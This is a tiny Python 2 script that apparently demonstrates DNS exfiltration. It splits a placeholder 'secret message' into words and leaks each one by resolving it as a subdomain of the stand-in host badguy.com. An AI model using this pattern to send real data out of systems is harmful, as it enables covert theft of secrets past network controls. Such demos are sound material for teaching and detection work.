import socket
import time


UDP_IP = "127.0.0.1"
UDP_PORT = 53
MESSAGE = "This is the secret message. I love DFTP. This is the end of the secret message."
SPLIT_MESSAGE = MESSAGE.split()

print "UDP target IP:", UDP_IP
print "UDP target port:", UDP_PORT
print "message:", MESSAGE

for word in SPLIT_MESSAGE:
    socket.gethostbyname(word+'.badguy.com')
    time.sleep(0.5)


